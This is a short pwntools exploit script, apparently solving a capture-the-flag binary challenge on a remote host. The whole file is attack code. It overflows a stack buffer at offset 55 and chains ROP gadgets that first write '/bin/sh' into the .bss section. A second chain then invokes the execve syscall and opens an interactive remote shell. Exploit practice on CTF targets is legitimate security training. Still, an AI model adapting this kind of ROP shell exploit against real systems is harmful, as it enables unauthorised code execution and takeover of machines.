from pwn import *

exe = context.binary = ELF("./main")
# r = process()
r = remote("chal.78727867.xyz",34000)
offset = 55
rop = ROP(exe)
mov_rsi_rax = 0x0000000000428d85
pop_rax = 0x00000000004297c3
pop_rsi_rbp = 0x0000000000403d5a
pop_rdi_rbp = 0x0000000000403a44
syscall = 0x0000000000412746
rop.raw(b"\x00")
rop.raw(b"A" * offset)
# rop.raw(b"B" * 6)
rop.raw(pop_rsi_rbp)
rop.raw(exe.bss())
rop.raw(exe.bss() + 500)
rop.raw(pop_rax)
rop.raw(b"/bin/sh\x00")
rop.raw(mov_rsi_rax)
rop.raw(exe.sym['main'])
sleep(3)
r.sendline(rop.chain())
write("p",rop.chain())
# act 2
rop2 = ROP(exe)
rop2.raw(b"\x00")
rop2.raw(b"A" * offset)
# rop2.raw(b"B" * 6)
rop2.raw(pop_rsi_rbp)
rop2.raw(0x0)
rop2.raw(exe.bss() + 500)
rop2.raw(pop_rdi_rbp)
rop2.raw(exe.bss())
rop2.raw(exe.bss() + 500)
rop2.raw(pop_rax)
rop2.raw(59)
rop2.raw(syscall)
r.sendline(rop2.chain())
r.interactive()
